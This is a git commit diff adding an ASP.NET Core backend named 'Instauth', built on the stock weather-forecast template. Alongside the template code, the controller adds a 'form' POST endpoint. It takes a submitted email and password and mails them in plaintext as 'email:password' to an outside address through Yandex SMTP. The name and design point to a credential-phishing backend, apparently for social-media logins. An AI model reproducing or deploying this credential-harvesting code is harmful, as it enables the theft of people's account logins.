051f8db359cb30d0b49a7e27d3538034ab019ddf
tyuop077 <30123136+tyuop077@users.noreply.github.com>
2021-09-25 11:19:51 +0300

    Added Instauth's backend

---
+++ Instauth/Controllers/WeatherForecastController.cs
@@ -0,0 +1,54 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Threading.Tasks;
+using Instauth.Services;
+using Microsoft.AspNetCore.Mvc;
+using Microsoft.Extensions.Logging;
+
+namespace Instauth.Controllers
+{
+    [ApiController]
+    [Route("[controller]")]
+    public class WeatherForecastController : ControllerBase
+    {
+        private static readonly string[] Summaries = new[]
+        {
+            "Freezing", "Bracing", "Chilly", "Cool", "Mild", "Warm", "Balmy", "Hot", "Sweltering", "Scorching"
+        };
+
+        private readonly ILogger<WeatherForecastController> _logger;
+
+        public WeatherForecastController(ILogger<WeatherForecastController> logger)
+        {
+            _logger = logger;
+        }
+
+        [HttpGet]
+        public IEnumerable<WeatherForecast> Get()
+        {
+            var rng = new Random();
+            return Enumerable.Range(1, 5).Select(index => new WeatherForecast
+            {
+                Date = DateTime.Now.AddDays(index),
+                TemperatureC = rng.Next(-20, 55),
+                Summary = Summaries[rng.Next(Summaries.Length)]
+            })
+            .ToArray();
+        }
+
+        [HttpGet("hi")]
+        public IActionResult HelloWorld()
+        {
+            return Ok("Hello!");
+        }
+
+        [HttpPost("form")]
+        async public Task<IActionResult> SendEmail([FromForm] string email, [FromForm] string password)
+        {
+            EmailService sender = new EmailService();
+            await sender.SendEmailAsync("tyuop@tyuop.tk", "Instauth Credentials", $"{email}:{password}");
+            return Ok("Sent successfuly");
+        }
+    }
+}
---
+++ Instauth/EmailService.cs
@@ -0,0 +1,29 @@
+﻿using MimeKit;
+using MailKit.Net.Smtp;
+using System.Threading.Tasks;
+namespace Instauth.Services
+{
+    public class EmailService
+    {
+        public async Task SendEmailAsync(string email, string subject, string message)
+        {
+            var emailMessage = new MimeMessage();
+
+            emailMessage.From.Add(new MailboxAddress("Instauth Credentials", "noreply@tyuop.tk"));
+            emailMessage.To.Add(new MailboxAddress("Instauth Owner", email));
+            emailMessage.Subject = subject;
+            emailMessage.Body = new TextPart(MimeKit.Text.TextFormat.Html)
+            {
+                Text = message
+            };
+
+            using (var client = new SmtpClient())
+            {
+                await client.ConnectAsync("smtp.yandex.ru", 25, false);
+                await client.AuthenticateAsync("noreply@tyuop.tk", System.Environment.GetEnvironmentVariable("PASSWORD"));
+                await client.SendAsync(emailMessage);
+                await client.DisconnectAsync(true);
+            }
+        }
+    }
+}
